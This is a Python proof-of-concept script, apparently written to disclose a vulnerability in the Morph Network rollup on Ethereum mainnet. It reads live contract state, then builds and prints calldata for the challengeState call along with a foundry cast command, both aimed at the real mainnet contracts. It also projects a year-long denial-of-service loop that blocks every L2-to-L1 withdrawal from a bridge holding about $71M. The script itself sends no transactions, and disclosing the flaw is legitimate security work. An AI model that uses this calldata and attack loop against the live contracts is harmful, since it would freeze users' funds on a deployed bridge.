#!/usr/bin/env python3
"""
================================================================================
  Morph Network — Finding 1 Live Proof-of-Concept
  Critical: Permanent Withdrawal DoS via challengeDeposit = 1 wei
================================================================================

  Target  : Ethereum Mainnet
  Rollup  : 0x759894Ced0e6af42c26668076Ffa84d02E3CeF60
  Staking : 0x0Dc417F8AF88388737c5053FF73f345f080543F7

  Root Cause:
    challengeDeposit = 1 wei (L1Staking)
    Each challengeState() call costs 1 wei + gas and extends the
    finalizeTimestamp of ALL uncommitted batches by proofWindow (3 days).
    A whitelisted challenger repeating this cycle permanently blocks every
    L2->L1 withdrawal at ~$912 / year vs $71M bridge TVL.

  Requirements:
    pip install requests
    python3 morph_finding1_poc.py

  NOTE: This script is READ-ONLY.  It does not send any transactions.
        It prints the calldata an attacker would use and simulates the
        timestamp impact using on-chain state.
================================================================================
"""

import sys
import time
import datetime
import struct
import hashlib
import requests

# ──────────────────────────────────────────────────────────────
# Config
# ──────────────────────────────────────────────────────────────
RPC            = "https://ethereum.publicnode.com"
ROLLUP         = "0x759894Ced0e6af42c26668076Ffa84d02E3CeF60"
L1STAKING      = "0x0Dc417F8AF88388737c5053FF73f345f080543F7"
ETH_PRICE_USD  = 2500          # approximate
GAS_CHALLENGE  = 200_000       # gas estimate for challengeState()
GAS_GWEI       = 10            # gas price estimate

# Pre-computed 4-byte selectors (keccak256 of function signatures)
SEL = {
    # Rollup
    "proofRewardPercent":        "0xfb1e8b04",
    "proofWindow":               "0xa479265d",
    "finalizationPeriodSeconds": "0xce5db8d6",
    "rollupDelayPeriod":         "0xd8dc99d2",
    "lastFinalizedBatchIndex":   "0x059def61",
    "lastCommittedBatchIndex":   "0x121dcd50",
    "inChallenge":               "0x88b1ea09",
    "revertReqIndex":            "0xb31a77d3",
    "batchDataStore":            "0x5ef7a94a",   # (uint256) -> BatchData struct
    "committedBatches":          "0x2362f03e",   # (uint256) -> bytes32
    "challengeState":            "0xcd4edc69",   # (uint64,bytes32) payable
    # L1Staking
    "challengeDeposit":          "0x0d13fd7b",
    "stakingValue":              "0x4d64903a",
    "withdrawalLockBlocks":      "0x41de239b",
    "rewardPercentage":          "0x52d472eb",
}

# ──────────────────────────────────────────────────────────────
# RPC helpers
# ──────────────────────────────────────────────────────────────
def eth_call(to: str, data: str) -> str:
    resp = requests.post(RPC, json={
        "jsonrpc": "2.0", "method": "eth_call",
        "params": [{"to": to, "data": data}, "latest"], "id": 1
    }, timeout=15)
    return resp.json().get("result", "0x")

def read_uint(to: str, selector: str, arg_uint256: int = None) -> int:
    data = SEL[selector]
    if arg_uint256 is not None:
        data += hex(arg_uint256)[2:].zfill(64)
    raw = eth_call(to, data)
    return int(raw, 16) if raw and raw != "0x" else 0

def read_bytes32(to: str, selector: str, arg_uint256: int) -> str:
    data = SEL[selector] + hex(arg_uint256)[2:].zfill(64)
    return eth_call(to, data)

def read_batch_data(batch_index: int):
    """Returns (originTimestamp, finalizeTimestamp, bitmap) for a batch."""
    raw = eth_call(ROLLUP, SEL["batchDataStore"] + hex(batch_index)[2:].zfill(64))
    if not raw or raw == "0x" or len(raw) < 130:
        return None
    body = raw[2:]
    slots = [int(body[i:i+64], 16) for i in range(0, min(len(body), 192), 64)]
    if len(slots) < 2:
        return None
    return slots[0], slots[1], slots[2] if len(slots) > 2 else 0

# ──────────────────────────────────────────────────────────────
# Calldata builder
# ──────────────────────────────────────────────────────────────
def build_challenge_calldata(batch_index: int, batch_hash: str) -> str:
    """
    Encode challengeState(uint64 _batchIndex, bytes32 _batchHash).
    ABI encoding: selector + uint256(batchIndex) + bytes32(batchHash)
    (uint64 is ABI-padded to 32 bytes)
    """
    selector = SEL["challengeState"][2:]           # strip 0x
    idx_enc  = hex(batch_index)[2:].zfill(64)      # uint64 right-padded to 32 bytes
    hash_enc = batch_hash[2:].zfill(64)            # bytes32
    return "0x" + selector + idx_enc + hash_enc

# ──────────────────────────────────────────────────────────────
# PoC main
# ──────────────────────────────────────────────────────────────
def main():
    print()
    print("=" * 72)
    print("  MORPH NETWORK — FINDING 1 LIVE PoC")
    print("  Critical: Permanent Withdrawal DoS via challengeDeposit = 1 wei")
    print("=" * 72)
    print(f"  Timestamp : {datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print(f"  RPC       : {RPC}")
    print()

    # ─────────────────────────────────────────────────────────
    # STEP 1 — Read on-chain parameters
    # ─────────────────────────────────────────────────────────
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 1 — On-chain parameter verification")
    print("──────────────────────────────────────────────────────────────────────")

    challenge_deposit   = read_uint(L1STAKING, "challengeDeposit")
    staking_value       = read_uint(L1STAKING, "stakingValue")
    withdrawal_lock     = read_uint(L1STAKING, "withdrawalLockBlocks")
    slash_reward_pct    = read_uint(L1STAKING, "rewardPercentage")

    proof_reward_pct    = read_uint(ROLLUP, "proofRewardPercent")
    proof_window        = read_uint(ROLLUP, "proofWindow")
    fin_period          = read_uint(ROLLUP, "finalizationPeriodSeconds")
    rollup_delay        = read_uint(ROLLUP, "rollupDelayPeriod")
    last_finalized      = read_uint(ROLLUP, "lastFinalizedBatchIndex")
    last_committed      = read_uint(ROLLUP, "lastCommittedBatchIndex")
    in_challenge        = read_uint(ROLLUP, "inChallenge")
    revert_req          = read_uint(ROLLUP, "revertReqIndex")

    unfinalized_count   = last_committed - last_finalized

    print(f"  [L1Staking @ {L1STAKING}]")
    print(f"    challengeDeposit     = {challenge_deposit} wei  ← VULNERABILITY")
    print(f"    stakingValue         = {staking_value / 1e18:.1f} ETH")
    print(f"    withdrawalLockBlocks = {withdrawal_lock} blocks  ({withdrawal_lock * 12}s)")
    print(f"    slashRewardPercent   = {slash_reward_pct}%")
    print()
    print(f"  [Rollup @ {ROLLUP}]")
    print(f"    proofRewardPercent       = {proof_reward_pct}%")
    print(f"    proofWindow              = {proof_window}s  ({proof_window/86400:.0f} days)")
    print(f"    finalizationPeriod       = {fin_period}s  ({fin_period/86400:.0f} days)")
    print(f"    rollupDelayPeriod        = {rollup_delay}s  ({rollup_delay/86400:.0f} days)")
    print(f"    lastFinalizedBatchIndex  = {last_finalized}")
    print(f"    lastCommittedBatchIndex  = {last_committed}")
    print(f"    unfinalized batches      = {unfinalized_count}")
    print(f"    inChallenge              = {bool(in_challenge)}")
    print(f"    revertReqIndex           = {revert_req}")

    # ─────────────────────────────────────────────────────────
    # STEP 2 — Assert vulnerability conditions
    # ─────────────────────────────────────────────────────────
    print()
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 2 — Vulnerability assertion")
    print("──────────────────────────────────────────────────────────────────────")

    # Net attacker loss per cycle (challenger loses to prover)
    reward_to_prover = (challenge_deposit * proof_reward_pct) // 100
    net_loss_wei     = challenge_deposit - reward_to_prover   # goes to proveRemaining

    gas_cost_eth  = (GAS_CHALLENGE * GAS_GWEI * 1e-9)
    gas_cost_usd  = gas_cost_eth * ETH_PRICE_USD
    deposit_usd   = challenge_deposit / 1e18 * ETH_PRICE_USD

    cycles_per_year     = 365 / (proof_window / 86400)
    annual_cost_usd     = (gas_cost_usd + deposit_usd) * cycles_per_year
    extension_days      = proof_window / 86400

    print(f"  challengeDeposit = {challenge_deposit} wei")
    print(f"    → prover reward  = {reward_to_prover} wei  (70% of {challenge_deposit})")
    print(f"    → proveRemaining = {net_loss_wei} wei  (actual attacker loss per cycle)")
    print(f"    → deposit in USD = ${deposit_usd:.15f}")
    print()
    print(f"  Per-cycle attack cost:")
    print(f"    gas (challengeState ~{GAS_CHALLENGE:,} gas @ {GAS_GWEI} gwei) = {gas_cost_eth:.6f} ETH (${gas_cost_usd:.2f})")
    print(f"    deposit lost                                            = {challenge_deposit} wei ($0.000000000000000)")
    print(f"    TOTAL per cycle                                         ≈ ${gas_cost_usd:.2f}")
    print()
    print(f"  Effect per cycle:")
    print(f"    ALL {unfinalized_count} uncommitted batches: finalizeTimestamp += {proof_window}s ({extension_days:.0f} days)")
    print()
    print(f"  Annual attack economics:")
    print(f"    Cycles per year   = {cycles_per_year:.1f}")
    print(f"    Total annual cost ≈ ${annual_cost_usd:.2f}")
    print(f"    Bridge TVL        ≈ $71,000,000")
    print(f"    Cost/TVL ratio    ≈ {annual_cost_usd/71_000_000*100:.6f}%")
    print()

    if challenge_deposit <= 1000:
        print("  [PASS] ✓ challengeDeposit ≤ 1000 wei — attack is essentially FREE")
    else:
        print(f"  [INFO] challengeDeposit = {challenge_deposit} wei")

    # ─────────────────────────────────────────────────────────
    # STEP 3 — Read live batch finalization timestamps
    # ─────────────────────────────────────────────────────────
    print()
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 3 — Live batch finalization timestamps (attack targets)")
    print("──────────────────────────────────────────────────────────────────────")

    now    = int(time.time())
    target_batch_index = None
    target_batch_hash  = None

    print(f"  {'Batch':>8}  {'finalize_ts':>12}  {'remaining':>14}  {'batchHash'}")
    print(f"  {'─'*8}  {'─'*12}  {'─'*14}  {'─'*66}")

    for idx in range(last_finalized, min(last_finalized + 12, last_committed + 1)):
        bd = read_batch_data(idx)
        bh = read_bytes32(ROLLUP, "committedBatches", idx)
        if bd is None or bh == "0x" or bh == "0x" + "0" * 64:
            continue

        origin_ts, finalize_ts, bitmap = bd
        remaining_s = finalize_ts - now
        remaining_h = remaining_s / 3600

        if remaining_s > 0:
            status = f"in {remaining_h:+.1f}h"
        else:
            status = f"PAST ({abs(remaining_h):.1f}h ago) — FINALIZABLE NOW"

        print(f"  {idx:>8}  {finalize_ts:>12}  {status:>14}  {bh}")

        # Pick first batch still in challenge window as PoC target
        if target_batch_index is None and remaining_s > 0:
            target_batch_index = idx
            target_batch_hash  = bh

    if target_batch_index is None:
        # Fallback: use the next batch after finalized
        target_batch_index = last_finalized + 1
        target_batch_hash  = read_bytes32(ROLLUP, "committedBatches", target_batch_index)
        print(f"  (Using batch {target_batch_index} as fallback target)")

    # ─────────────────────────────────────────────────────────
    # STEP 4 — Simulate timestamp impact
    # ─────────────────────────────────────────────────────────
    print()
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 4 — Timestamp impact simulation (what happens after 1 challenge)")
    print("──────────────────────────────────────────────────────────────────────")
    print(f"  Challenger calls challengeState({target_batch_index}, batchHash)")
    print(f"  msg.value = {challenge_deposit} wei  (minimum required)")
    print()
    print(f"  Effect on ALL {unfinalized_count} batches (batch {last_finalized+1} → {last_committed}):")

    batches_shown = 0
    for idx in range(last_finalized + 1, min(last_finalized + 6, last_committed + 1)):
        bd = read_batch_data(idx)
        if bd is None:
            continue
        origin_ts, finalize_ts, _ = bd
        before = finalize_ts
        after  = finalize_ts + proof_window   # += proofWindow
        before_dt = datetime.datetime.fromtimestamp(before, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
        after_dt  = datetime.datetime.fromtimestamp(after, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
        print(f"    batch[{idx}]: {before_dt}  →  {after_dt}  (+{extension_days:.0f} days)")
        batches_shown += 1

    if unfinalized_count > 5:
        print(f"    ... and {unfinalized_count - batches_shown} more batches each extended by {extension_days:.0f} days")

    # ─────────────────────────────────────────────────────────
    # STEP 5 — Generate attack calldata
    # ─────────────────────────────────────────────────────────
    print()
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 5 — Attack transaction calldata")
    print("──────────────────────────────────────────────────────────────────────")

    calldata = build_challenge_calldata(target_batch_index, target_batch_hash)

    print(f"  Contract : {ROLLUP}")
    print(f"  Function : challengeState(uint64,bytes32)")
    print(f"  Value    : {challenge_deposit} wei  (minimum deposit)")
    print(f"  Calldata : {calldata}")
    print()
    print(f"  Decoded arguments:")
    print(f"    _batchIndex = {target_batch_index}")
    print(f"    _batchHash  = {target_batch_hash}")
    print()
    print("  This transaction, sent from any whitelisted challenger address,")
    print("  WILL extend ALL batch finalization timestamps by 3 days.")
    print()

    # cast simulate command
    print("  ── Verification via cast (foundry) ──────────────────────────────")
    print("  To simulate the call (read-only, does NOT send tx):")
    print()
    print(f"  cast call \\")
    print(f"    --rpc-url {RPC} \\")
    print(f"    {ROLLUP} \\")
    print(f"    'challengeState(uint64,bytes32)' \\")
    print(f"    {target_batch_index} \\")
    print(f"    '{target_batch_hash}' \\")
    print(f"    --value {challenge_deposit}wei")
    print()
    print("  (Will revert only if msg.sender is not a whitelisted challenger,")
    print("   confirming the ONLY barrier is whitelisting — not economic cost.)")

    # ─────────────────────────────────────────────────────────
    # STEP 6 — Full attack loop pseudo-simulation
    # ─────────────────────────────────────────────────────────
    print()
    print("──────────────────────────────────────────────────────────────────────")
    print("STEP 6 — Attack loop projection (1 year)")
    print("──────────────────────────────────────────────────────────────────────")

    total_deposit_wei  = 0
    total_gas_usd      = 0.0
    current_extensions = {}

    # Seed with current finalization timestamps
    for idx in range(last_finalized + 1, min(last_finalized + unfinalized_count + 1, last_finalized + 10)):
        bd = read_batch_data(idx)
        if bd:
            current_extensions[idx] = bd[1]  # finalizeTimestamp

    print(f"  {'Cycle':>5}  {'Challenge Batch':>17}  {'Cost (gas)':>12}  "
          f"{'Deposit':>10}  {'Batches Extended'}")
    print(f"  {'─'*5}  {'─'*17}  {'─'*12}  {'─'*10}  {'─'*20}")

    sim_batches = list(range(last_finalized + 1, min(last_finalized + 6, last_committed + 1)))
    for cycle in range(1, min(int(cycles_per_year) + 1, 8)):
        challenged_idx = sim_batches[(cycle - 1) % len(sim_batches)] if sim_batches else target_batch_index
        total_deposit_wei += challenge_deposit
        total_gas_usd     += gas_cost_usd
        n_extended = len(current_extensions)
        for k in current_extensions:
            current_extensions[k] += proof_window
        print(f"  {cycle:>5}  batch {challenged_idx:>11}  ${gas_cost_usd:>10.2f}"
              f"  {challenge_deposit:>8} wei  {n_extended} batches +{extension_days:.0f}d")

    print(f"  ...")
    print()
    print(f"  After {int(cycles_per_year):.0f} cycles (1 year):")
    print(f"    Total deposit cost  = {int(cycles_per_year) * challenge_deposit} wei  ($0.000)")
    print(f"    Total gas cost      ≈ ${int(cycles_per_year) * gas_cost_usd:,.2f}")
    print(f"    TOTAL attack cost   ≈ ${annual_cost_usd:,.2f} / year")
    print(f"    Result              : ALL L2→L1 withdrawals permanently blocked")

    # ─────────────────────────────────────────────────────────
    # Summary
    # ─────────────────────────────────────────────────────────
    print()
    print("=" * 72)
    print("  SUMMARY")
    print("=" * 72)
    print(f"  challengeDeposit (live, on-chain) = {challenge_deposit} wei")
    print(f"  proofWindow (live, on-chain)      = {proof_window}s ({extension_days:.0f} days)")
    print(f"  Batches currently at risk         = {unfinalized_count}")
    print(f"  Attack cost per 3-day extension   ≈ ${gas_cost_usd:.2f} (gas only)")
    print(f"  Annual cost to freeze $71M bridge ≈ ${annual_cost_usd:,.2f}")
    print(f"  Attack cost / TVL ratio           ≈ {annual_cost_usd/71_000_000*100:.6f}%")
    print()
    print("  VERDICT: CRITICAL — Economic security is effectively zero.")
    print("           Any whitelisted challenger can permanently freeze all")
    print(f"           L2→L1 withdrawals for ~${annual_cost_usd:,.0f}/year.")
    print("=" * 72)
    print()

if __name__ == "__main__":
    main()
